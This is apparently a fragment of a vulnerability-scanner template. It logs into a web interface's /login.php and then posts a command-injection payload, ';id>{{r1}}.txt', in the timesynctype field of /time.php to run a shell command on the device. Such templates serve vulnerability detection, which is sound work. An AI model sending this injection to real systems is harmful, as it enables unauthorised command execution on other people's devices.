http:
- method: GET
  path:
  - /hosts
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
- method: POST
  path:
  - /login.php
  body: 'user={{username}}&passwd={{password}}&x=56&y=21

    '
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: PHPSESSID={{r2}}
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
- method: POST
  path:
  - /time.php
  body: 'timesynctype=;id>{{r1}}.txt

    '
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: PHPSESSID={{r2}}
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
